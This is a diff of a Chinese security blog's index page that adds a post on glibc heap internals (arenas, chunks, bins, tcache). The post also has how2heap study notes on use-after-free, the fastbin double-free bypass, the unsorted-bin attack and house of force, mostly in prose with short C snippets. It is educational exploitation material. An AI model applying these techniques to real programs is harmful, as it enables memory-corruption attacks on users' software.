@@ -155,6 +155,298 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CharonPt的Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/" class="post-title-link" itemprop="url">堆相关</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-03-19 16:48:28" itemprop="dateCreated datePublished" datetime="2022-03-19T16:48:28+08:00">2022-03-19</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-04-08 14:22:43" itemprop="dateModified" datetime="2022-04-08T14:22:43+08:00">2022-04-08</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h2><p>堆是存在于程序虚拟地址空间中的一块连续的线性区域，其提供动态分配内存，允许程序申请大小未知的内存。</p>
+<p>堆的位置可以是紧贴数据段的上方，也可以是mmap中的某个位置</p>
+<h2 id="堆管理器"><a href="#堆管理器" class="headerlink" title="堆管理器"></a>堆管理器</h2><p>堆管理器在用户与操作系统之间作为动态内存管理的中间人，其响应用户申请内存的请求，并向操作系统申请内存，然后将其返回给用户程序。同时其管理用户所释放的内存，适时归还给操作系统。</p>
+<p>堆管理器并非由操作系统实现，而是<strong>由libc.so.6链接库</strong>实现，也就是说这段实现的代码存在于libc库中。其中封装了一些系统调用，为用户提供方便的动态内存分配接口的同时，力求高效的管理由系统调用申请来的内存。</p>
+<p>不同操作系统的堆管理器也是不一样的</p>
+<ul>
+<li>dlmalloc - General purpose allocator</li>
+<li><strong>ptmalloc2 - glibc</strong></li>
+<li>jemalloc - FreeBSD and Firefox</li>
+<li>tcmalloc - Google</li>
+<li>libumen - Solaris</li>
+</ul>
+<p>申请内存的系统调用：</p>
+<ul>
+<li>brk</li>
+<li>mmap（memory map - 内存映射）</li>
+</ul>
+<p>brk系统调用获取内存的方式就是从数据段的末尾（也就是data段的末尾）向上拓展一块空间，这块拓展出来的空间就属于heap段了，每执行一次brk系统调用，就把这块拓展的空间拓展得再大一些，使得堆内存不断地增长。</p>
+<p>mmap系统调用用于向操作系统申请一大块内存空间，这块申请得到的空间放在mmap段的某个位置。对于每一块新的内存申请，先在物理内存中开辟其空间，然后再映射到虚拟内存中。</p>
+<p>获取堆空间的这两种方式主要由两个要素决定：</p>
+<p>主线程可以用brk也可以用mmap，子线程只能用mmap。其次主线程如果申请的内存区域过大的话，会直接用mmap在mmap段得到一块大的空间，如果申请的比较小的话，那么会使用brk直接在数据段上方拓展一块空间。</p>
+<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/%E7%9F%A5%E8%AF%86%E7%82%B9-1.png" class>
+
+<p>如上图，程序通过malloc向堆管理器申请内存，堆管理器通过系统调用（brk或mmap）向操作系统申请内存。</p>
+<h2 id="堆管理器是如何工作的"><a href="#堆管理器是如何工作的" class="headerlink" title="堆管理器是如何工作的"></a>堆管理器是如何工作的</h2><p>首先需要知道三个关键词</p>
+<ul>
+<li>arena</li>
+<li>chunk</li>
+<li>bin</li>
+</ul>
+<h3 id="arena"><a href="#arena" class="headerlink" title="arena"></a>arena</h3><p>arena称为内存分配区，可以理解为堆管理器所持有的内存池。堆管理器与用户的内存交易发生在arena中。</p>
+<blockquote>
+<p>操作系统 –&gt; 堆管理器 –&gt; 用户</p>
+<p>物理内存 –&gt; arena –&gt; 可用内存</p>
+</blockquote>
+<p>例如主个线程在data段上方申请了堆这样一个段，那么在堆段中就会将申请得到的内存组合形成一个arena，这个arena分配区会有一个对应的控制结构来描述这个分配区的相关信息</p>
+<p>一个进程可以有多个arena，因为一个进程可以由多个线程构成，每个线程（包括主线程）都会有一个arena分配区，同时有各自对应的控制结构</p>
+<p>arena里有一段控制结构，叫<code>malloc _state</code>，该结构的细节如下：</p>
+<p><strong>main arena</strong> <strong>的</strong> <strong>malloc_state</strong> <strong>并不是</strong> <strong>heap segment</strong> <strong>的一部分，而是一个全局变量，存储在</strong> <strong>libc.so</strong> <strong>的数据段</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> &#123;</span></span><br><span class="line">    <span class="comment">/* Serialize access.  */</span></span><br><span class="line">    __libc_lock_define(, mutex);    <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">    <span class="keyword">int</span> flags;    <span class="comment">/* Fastbins */</span></span><br><span class="line">    mfastbinptr fastbinsY[ NFASTBINS ];    <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">    mchunkptr top;    <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">    mchunkptr last_remainder;    <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">    mchunkptr bins[ NBINS * <span class="number">2</span> - <span class="number">2</span> ];    <span class="comment">/* Bitmap of bins, help to speed up the process of determinating if a given bin is definitely empty.*/</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> binmap[ BINMAPSIZE ];    <span class="comment">/* Linked list, points to the next arena */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span>    <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">       by free_list_lock in arena.c.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span>    <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">       the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">       free_list_lock in arena.c.  */</span></span><br><span class="line">    INTERNAL_SIZE_T attached_threads;    <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">    INTERNAL_SIZE_T system_mem;</span><br><span class="line">    INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>在<code>malloc_state</code>中有两个链表，分别为<code>fastbinY[]</code>和<code>bins[]</code>，<code>fastbinsY[]</code>属于<code>fast bins</code>，而在<code>bins[]</code>中被划分了三个区域，分别属于<code>unsorted bin</code>、<code>small bins</code>和<code>large bins</code></p>
+<h3 id="chunk"><a href="#chunk" class="headerlink" title="chunk"></a>chunk</h3><p>用户申请内存的单位，也是堆管理器管理内存的基本单位。</p>
+<p>glibc中用一个结构体定义了chunk，其中包含6个控制信息，不同的chunk所用到的控制信息的数量不尽相同</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line">	INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">	INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line">	<span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<h4 id="malloced-chunk"><a href="#malloced-chunk" class="headerlink" title="malloced chunk"></a>malloced chunk</h4><p>如<code>void* ptr = malloc(0x100);</code>这条语句执行完毕后就会得到一个malloced chunk。一个malloced chunk的头部有两个字长的控制信息，剩下部分属于数据区域。如下：</p>
+<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/%E7%9F%A5%E8%AF%86%E7%82%B9-2.png" class>
+
+<p>malloc()返回的指针指向该chunk的<strong>数据区域</strong></p>
+<p>同时当我们<code>malloc(0x100)</code>的时候这个<code>0x100</code>对应的是一个chunk的数据区的大小，而一个malloced chunk还会有两个字长的控制信息，所以实际上得到的是一个<code>0x110</code>大小的chunk</p>
+<p>如果上一个chunk是free chunk，那么<code>prev size</code>用来记录这个free chunk的大小，如果上一个chunk是malloced chunk，那么<code>prev size</code>用来存储前一个chunk的数据</p>
+<h5 id="prev-size的覆用问题"><a href="#prev-size的覆用问题" class="headerlink" title="prev size的覆用问题"></a>prev size的覆用问题</h5><ul>
+<li><p>以64位平台为例，如执行了<code>void* ptr = malloc(0x20);free(ptr);</code>这样的操作后，再次<code>malloc(0x20)</code>的话，堆管理器因为有能刚好满足申请大小的free chunk，所以会把这块free chunk重新返回给用户使用。那么如果<code>malloc(0x28)</code>呢？实际上堆管理器会把下一块紧邻的chunk的prev size部分的一个字长也作为数据区来使用，补足缺少的0x8个字节。这时因为prev size记录的是上一个free chunk的大小，所以当上一个chunk不是free chunk的时候，prev size就不再使用，所以可以用来当作数据区的一部分。所以对于<code>malloc(0xn0)</code>和<code>malloc(0xn8)</code>，堆管理器分配给用户的空间是一样的。当有连续的malloced chunk的时候，往往这些chunk都只有一个字长的控制字段，即<code>size</code>，因为<code>prev size</code>被上一个malloced chunk用作数据区了。</p>
+<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/%E7%9F%A5%E8%AF%86%E7%82%B9-4.jpg" class>
+
+<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/%E7%9F%A5%E8%AF%86%E7%82%B9-5.jpg" class></li>
+</ul>
+<p>这里的<code>size</code>控制信息记录的是自己这个chunk的总大小（包含两个字长的控制信息），同时其最低三位（3bit）同样是控制信息。</p>
+<p>为什么能拿这三位用作控制信息？</p>
+<p>因为一个malloed chunk的头部有两个字长的控制信息，这就意味着一个malloced chunk的大小至少不会小于八个字节（32位的两个字长），同时chunk分配时遵循一个规则：只能分配字长整数倍的chunk（如字长64位下是8，则malloc得到的chunk只能是8的整数倍），如果申请分配的内存不是字长的整数倍，则堆管理器默认分配能满足申请内存大小且是字长整数倍的内存。这就意味着如果只记录大小的话，<code>size</code>的最低三位一定是0，所以干脆就把这三位用来记录别的控制信息，而不是浪费掉用来写0。</p>
+<p>其中<code>A</code>（NON_MAIN_ARENA）记录当前chunk是否不属于主线程，1表示不属于，0表示属于。<code>M</code>（IS_MAPPED）记录该chunk是否由mmap分配的，<code>P</code>(previous in use)代表上一个chunk是否在被使用，如果是1表示上一个chunk是malloced chunk，如果是0表示上一个chunk是free chunk。</p>
+<h4 id="free-chunk"><a href="#free-chunk" class="headerlink" title="free chunk"></a>free chunk</h4><p>如<code>free(ptr);</code>这条语句执行完毕后会改变上面语句得到的malloced chunk的结构，而不是令malloced chunk消失，这个free掉的chunk称为free chunk。</p>
+<blockquote>
+<p>free掉malloc分配的内存后这段内存并不会直接返还给物理内存，而是返回给堆管理器。这里涉及系统调用的问题，因为用户内存和物理内存的交互一定要进行系统调用才能进行，而频繁地进行系统调用会大量消耗资源，以缓冲区为例：</p>
+<p>缓冲区的存在就是为了减少系统调用，以stdout为例，若没有缓冲区，程序每接收到一个字符就要申请一次系统调用来向屏幕进行输出，这样会频繁地进行系统调用浪费资源，而缓冲区则是用来暂时存放这些要发送的字符的空间，满足了一定条件后再申请一次系统调用一次性地将缓冲区内的内容输出到屏幕中。</p>
+<p>而堆管理器其实也是类似作用，堆管理器作为操作系统和用户交互的中介，堆管理器一次性向操作系统申请超过用户需求的内存空间，然后把这些内存管理起来，这样用户在向堆管理器申请内存或释放内存时就不再需要经过系统调用，这样就大量减少了系统调用的次数。</p>
+<p>系统调用消耗资源的原因是从用户态代码切换到内核态代码时需要保存各种状态值和进行各种环境的部署，最后才能执行一个系统调用的函数。</p>
+</blockquote>
+<p>free chunk根据chunk大小、释放的时机被分成几种：</p>
+<ol>
+<li>fastbin free chunk</li>
+<li>smallbin free chunk</li>
+<li>unsortedbin free chunk</li>
+<li>largebin free chunk</li>
+</ol>
+<p>一个chunk被free掉之后会多形成几段控制信息，不同的free chunk所用到的控制信息不尽相同，具体如下图：</p>
+<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/free-chunk.jpg" class>
+
+<ul>
+<li><p><code>fd</code>（forward）指针在bin中指向下一个（非物理相邻）free chunk</p>
+</li>
+<li><p><code>bk</code>（backward）指针在bin中指向上一个（非物理相邻）free chunk</p>
+</li>
+<li><p><code>fd_nextsize</code>在large bin中指向前一个与当前chunk大小不同的第一个free chunk（不包含bin头指针）</p>
+<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/fd_nextsize.jpg" class></li>
+<li><p><code>bk_nextsize</code>在large bin中指向后一个与当前chunk大小不同的第一个free chunk（不包含bin头指针）</p>
+<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/bk_nextsize.jpg" class>
+
+<ul>
+<li>一般空闲的large chunk在fd的遍历顺序中，按照由大到小的顺序排列。这样做可以避免在寻找合适chunk时挨个遍历</li>
+</ul>
+</li>
+</ul>
+<p>当一个chunk被free掉时，其会检查<code>size</code>中的<code>P</code>位来判断该chunk的上一个chunk是否也是free chunk，如果同样是free chunk则这两块free chunk会被合并，同时这个free chunk（刚被释放的这个chunk）的所有控制信息会作为合并后的chunk的数据区的一部分，图例如下：</p>
+<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/%E7%9F%A5%E8%AF%86%E7%82%B9-3.jpg" class>
+
+<p>有一点要注意的是这个被free掉的chunk中的所有数据在合并前后都不会被抹除，只是被作为合并后的chunk的数据区了。</p>
+<h5 id="物理链表"><a href="#物理链表" class="headerlink" title="物理链表"></a>物理链表</h5><p>因为<code>prev size</code>的存在，每个chunk都知道上一个chunk的大小，这样每个chunk就知道上一个chunk的起始地址，以此类推，这样每个内存分配区就知道了自己的分配空间和分配位置</p>
+<h5 id="逻辑链表"><a href="#逻辑链表" class="headerlink" title="逻辑链表"></a>逻辑链表</h5><p>有些chunk中存在<code>fd</code>、<code>bk</code>这样的指针，利用这些指针就可以构成一个逻辑链表</p>
+<h4 id="top-chunk"><a href="#top-chunk" class="headerlink" title="top chunk"></a>top chunk</h4><p>堆管理器通过系统调用向系统申请的内存中，未分配给用户的（即堆管理器留下来的）形成Top chunk，可以理解为堆管理器的库存。</p>
+<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/top-chunk.jpg" class>
+
+<h3 id="bin"><a href="#bin" class="headerlink" title="bin"></a>bin</h3><p>管理arena中空闲的chunk结构，<strong>以数组的形式存在</strong>，数组元素为相应大小的chunk链表的链表头，存在于arena的malloc_state中。</p>
+<ul>
+<li>unsorted bin</li>
+<li>fast bins</li>
+<li>small bins</li>
+<li>large bins</li>
+<li>（tcache）</li>
+</ul>
+<h5 id="bin的实现思想"><a href="#bin的实现思想" class="headerlink" title="bin的实现思想"></a>bin的实现思想</h5><p>bin的作用是保管用户暂时不需要的内存空间，当用户需要重新申请内存的时候，bin会在自己的链表中寻找有没有满足需求的chunk，如果bin中有刚好满足需求的chunk，则直接把这块chunk重新分配。</p>
+<p>那么要怎么知道bin中有没用正好满足需求的chunk呢？</p>
+<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/bin-1.jpg" class>
+
+<p>如上的<code>fast bins</code>：每一个特定大小的bin都是<code>fast bins</code>里的一部分，bin的本质是一个数组，数组中的每一项都对应一个特定大小的chunk链表的链表头，该链表头作为一个指针指向了一个符合其大小的fastbin free chunk，然后这些相同大小的chunk通过指针指向下一个chunk的头部来形成逻辑链表，这条串起来的链表最后形成了一个bin。</p>
+<p>对于fast bins，malloc分配内存时返回的就是满足需求大小的bin的链表中的最后一个chunk的数据体的地址，且fast bins中的每一个chunk的size中的P位都为1，这是为了防止chunk的合并等操作导致的速度的下降，这是fast bins的特点之一</p>
+<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/bin-2.jpg" class>
+
+<p>fast bins是单向链表，其他类型的bins都是双向链表（fd指针指向下一个chunk，bk指针指向上一个chunk，第一个chunk的bk指针指向bin头，最后一个chunk的fd指针指向bin头）fd和bk其实属于数据体。</p>
+<p>双向链表中，最先连接到bins中的chunk最先离开（FIFO）。</p>
+<h4 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h4><ul>
+<li><p>bins[1]（malloc_state中的bins数组索引为1的元素属于<code>unsorted bin</code>）</p>
+</li>
+<li><p>管理刚刚释放且不能进入<code>fast bins</code>（小于<code>fast bins</code>的最小大小或者大于<code>fast bins</code>的最大大小）的还未分类的chunk</p>
+</li>
+<li><p>可以视为free chunk回归其所属bin之前的缓冲区</p>
+</li>
+</ul>
+<p>结构如下：</p>
+<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/unsorted-bin.jpg" class>
+
+<p>unsorted bin的合并：</p>
+<p>当有某种特殊情况，例如：用户malloc了一段在large bins范围内的chunk，且未在unsorted bin中找到这样一段满足用户需求的chunk时，就会触发unsorted bin的合并。此时就会遍历整个unsorted bin，并且把可以合并起来的（物理相邻的）chunk合并，合并完成后就把合并的chunk分类到其所属的bin中。</p>
+<h4 id="fast-bins"><a href="#fast-bins" class="headerlink" title="fast bins"></a>fast bins</h4><ul>
+<li>fastbinsY[]</li>
+<li>单向列表</li>
+<li>LIFO（last in first out）</li>
+<li>管理 16、24、32、40、48、56、64 Byte的free chunk（32位下，64位就乘2）</li>
+<li>其中 chunk 的 in use 位（size字段的P位）总为1</li>
+</ul>
+<p>结构如下：</p>
+<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/fast-bins.jpg" class>
+
+<h4 id="small-bins"><a href="#small-bins" class="headerlink" title="small bins"></a>small bins</h4><ul>
+<li><p>bins[2] ~ bins[63]</p>
+</li>
+<li><p>62个循环双向链表</p>
+</li>
+<li><p>FIFO（first in first out）</p>
+</li>
+<li><p>管理 16、24、32、40、……、504 Bytes 的 free chunks（32位下）</p>
+</li>
+<li><p>每个链表中存储的 chunk 大小都一致</p>
+</li>
+</ul>
+<p>结构如下：</p>
+<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/small-bins.jpg" class>
+
+<h4 id="large-bins"><a href="#large-bins" class="headerlink" title="large bins"></a>large bins</h4><ul>
+<li>bins[64] ~ bins[126]</li>
+<li>63个循环双向链表</li>
+<li>FIFO</li>
+<li>管理大于 504 Bytes 的 free chunks（32位下）</li>
+</ul>
+<p>结构如下：</p>
+<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/large-bins.jpg" class>
+
+<p>因为large bins中每个bin所管理的chunk大小都是不固定的（只是一个范围内），所以large bins要用到两个额外的控制字段（fd_nextsize、bk_nextsize）去记录每个chunk相邻（上一个和下一个）的chunk的大小是多少。</p>
+<h4 id="tcache"><a href="#tcache" class="headerlink" title="tcache"></a>tcache</h4><p>tcache可以理解为super fast bin，其工作模式跟fast bin类似，同样是单向链表。在chunk存放到fast bins之前，所有的chunk都会优先存在到tcache中，tcache也会存放一些特定范围的bins。</p>
+<p>在2.26和2.27的libc中，tcache没有double free检查，往后的版本新加了tcache的安全检查。</p>
+<h2 id="How2heap"><a href="#How2heap" class="headerlink" title="How2heap"></a>How2heap</h2><p>这里记一下从how2heap中学习所得</p>
+<h4 id="first-fit"><a href="#first-fit" class="headerlink" title="first-fit"></a>first-fit</h4><p>glibc使用第一契合算法来选择free chunk，就是如果程序在遍历bins链表的时候，如果找到一个free chunk足够大（也就是不小于用户需求），那么就会直接选择这个chunk来使用以此节省时间，而不是去遍历完所有的bin来寻找一个大小刚刚合适的chunk。</p>
+<p>如果遍历完bins链表都没有能满足用户需求大小的chunk，则在Top chunk中划分一块给用户。</p>
+<p>如果Top chunk的大小都不足以满足用户需求，则堆管理器再向系统申请内存，这里再分为：①申请的内存较小使用brk系统调用。②申请的内存较大使用mmap系统调用。</p>
+<p>综上：用户在申请内存时，先根据大小决定在哪个bins中寻找chunk，如果该申请的内存大小不满足fast bins的范围，则在unsorted bin中寻找，在unsorted bin中寻找不到就会触发其合并机制，合并完后进行归类，归类完后在对应大小的small bins或large bins中继续寻找。再找不到就top chunk…..</p>
+<p>只要在这个寻找的过程中找到了一个大于或等于用户申请需求的内存大小的chunk，则立刻停止寻找，这时这块chunk如果是大于申请需求的，则会进行划分，划分为刚好满足用户申请大小的chunk和剩余部分的chunk，这块剩余部分的chunk称为last remainder chunk，然后last remainder chunk会被填入相关控制字段，再重新进入unsorted bin中</p>
+<h4 id="use-after-free（释放重利用）"><a href="#use-after-free（释放重利用）" class="headerlink" title="use-after-free（释放重利用）"></a>use-after-free（释放重利用）</h4><p>（unsorted bin为双向链表，下图中省略了结构）（指针类型和malloc的大小为例子）</p>
+<p>① 依次执行 <code>char* a = malloc(0x512); char* b = malloc(0x256); free(a); </code></p>
+<p>由以上步骤得到如下图结构：</p>
+<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/use-after-free-1.jpg" class>
+
+<p>在这里要注意的是：一、<code>free(a);</code>之后a所指向的chunk中的数据不会被抹除，仅仅只是将这块chunk标记为free chunk。二、指针a（也就是malloc返回的指针）也不会消失，仍然指向原来的区域</p>
+<p>② <code>char* c = malloc(0x500);</code></p>
+<p>由于glibc的first fit算法，<code>malloc(0x500);</code>所得到的chunk会是刚释放掉的那块chunk，此时指针a跟指针c指向的是同一个位置</p>
+<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/use-after-free-2.png" class>
+
+<p>综上操作就得到了两个指向相同位置的指针，打印a和c，都会得到相同的内容，即原本chunk中的数据部分的内容</p>
+<h4 id="Double-free"><a href="#Double-free" class="headerlink" title="Double-free"></a>Double-free</h4><p>fast bins会检查列入它的链表中的chunk的大小是否符合它此时fast bin所对应的大小，例如一个fast bin要存放的是0x20大小的chunk，则在一个free chunk在进入这个bin的链表之前会进行两个检查：(一) 要放进来的这个chunk是否与<strong>上一个</strong>放进来的chunk相同（也就是防止一个chunk被连续free两次）。(二) 要放进来的这个chunk的大小是否与这个bin的规定存放大小相等。程序正常运行时不会出现这种不相等的情况，但是设置这个检查就是为了防止恶意攻击。</p>
+<p>fast bins的double free检查存在的缺陷是它只检查准备放进来的这个chunk是否与上一个chunk相同，而不会检查整个链表中是否有跟这个chunk相同的chunk，这种简单的检查设计也是同时在兼顾着fast bins的速度问题，如果加入一些繁杂的检查机制会导致拖慢fast bins的速度。所以只要在第二次free掉一个已经free掉的chunk前free掉另一个chunk就可以绕过double free检查。</p>
+<p>① <code>int* a = malloc(8); int* b = malloc(8); int* c = malloc(8); </code></p>
+<p>首先malloc三块符合fast bins的chunk</p>
+<p>② <code>free(a); free(b); free(a);</code></p>
+<p>然后让a指针所对应的chunk释放两次，因为double free检查的存在，所以中间先把b指针所对应的chunk给free掉。到目前为止就得到了如下的fast bins结构：</p>
+<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/double-free-1.jpg" class>
+
+<p>③ <code>int* d = malloc(8); malloc(8);</code></p>
+<p>用指针d接收第二次被free掉的那块chunk，然后再malloc一次把中间的那块chunk去掉</p>
+<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/double-free-2.png" class>
+
+<p>到这里为止我们发现fast bins的指针跟指针d都指向了同一块chunk</p>
+<p>对于d的指针来说，a是一块malloced chunk，所以d的指针认为它所指的位置是数据体部分，可以往里任意写入数据，但在fast bin中的a是一块free chunk，a的数据体部分的第一个字长用作fd指针，所以d的指针可以通过写入数据来使fast bin中的a的fd指针指向任意位置。</p>
+<p>④ 通过d的指针将a的fd指针修改为栈上的一块内存</p>
+<p>因为在bin的链表中仅仅依靠指针来寻找和确定有无下一个chunk，所以修改fd指针后fast bin中就相当于多出了一个chunk，如下图：</p>
+<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/double-free-3.png" class>
+
+<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/double-free-4.png" class>
+
+<p>注意fd指针和堆返回的指针指向不同。应使要修改的栈上的值在fd指针下面两个字节处。</p>
+<h4 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted-bin-attack"></a>unsorted-bin-attack</h4><p>该攻击能达到的效果是向任意地址写入一个较大的数字，前提是能控制bk的值。</p>
+<p>该攻击虽然能向任意地址写，但不能控制写入的值，一般是作为其他攻击的铺垫。</p>
+<p>fast bins在32位平台中存放的chunk的大小在16-64之间，但这个限制实际上是由arena中的一个控制字段控制的，所以如果利用unsorted bin attack将这个控制字段修改，就能修改存放在fast bins中的chunk大小的限制，使得所有chunk被free掉之后都存入fast bins中，再结合fast bins的攻击达到控制程序执行流等目的。</p>
+<p>首先要了解从unsorted bin中取出一个chunk的流程</p>
+<p>下图是unsorted bin的结构</p>
+<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/unsorted-bin-attack-1.jpg" class>
+
+<p>当从unsorted bin从取出一个chunk（这里称为chunk1）时，为了保证unsorted bin的双向链表结构的完整，程序会修改unsorted bin表头的fd指针和被取出的chunk指向的下一块chunk（这里称为chunk2）的bk指针。</p>
+<p>那么如何将unsorted bin表头的fd指针和chunk2的bk指针修改为正确的值呢？显然这两个对应的值储存在chunk1的fd指针和bk指针中，所以此时unsorted bin表头的fd指针就会填上chunk1的fd指针的值，chunk2的bk指针就会填上chunk1的bk指针的值。</p>
+<p>最后形成如下结构</p>
+<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/unsorted-bin-attack-2.jpg" class>
+
+<p>由上过程我们可以发现，如果我们能够控制chunk1的fd指针的值，那么就相当于我们能够让任意地址作为chunk2，且在chunk1被取出的时候，程序就会自动向chunk2的对应位置中写入unsorted bin表头的所在地址，对于主进程来说，这个地址位于libc的数据段中，所以会是一个比较大的值。综上我们就完成了一个较大值的任意地址写。</p>
+<h4 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house_of_force"></a>house_of_force</h4><p>需要：堆溢出</p>
+<p>通过堆溢出将top chunk的size控制字段修改成一个极大的数字，这是为了避免堆管理器在后面用mmap()系统调用来申请内存，以及让之后的内存申请都在top chunk中发生。</p>
+<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/house_of_force-1.jpg" class>
+
+<p>例如想修改栈上的一个值，我们第一次先malloc一个很大的空间，大到把栈的一部分也作为这块chunk的一部分，这块malloc的空间就会从top chunk当前的起始位置一直往内存的高地址划分，直到达到我们指定的大小，然后我们第二次再malloc一块chunk，那么这块chunk就会直接在栈上，此时我们就实现了往栈上写数据。</p>
+<p>而且如果我们malloc一个负数，那么就会在此时top chunk低地址处得到一块chunk（这是因为malloc的参数是无符号类型整数，所以我们传进一个负数的话会被解释成无符号类型整数，从而发生整数溢出，最后会得到从此时top chunk起始地址往低地址的一块对应大小的chunk），我们就可以用这种方式去修改程序段的某个地址的值。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/03/13/2021%E5%BC%BA%E7%BD%91%E6%9D%AF-shellcode/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1076,179 +1368,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/01/31/BROP/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
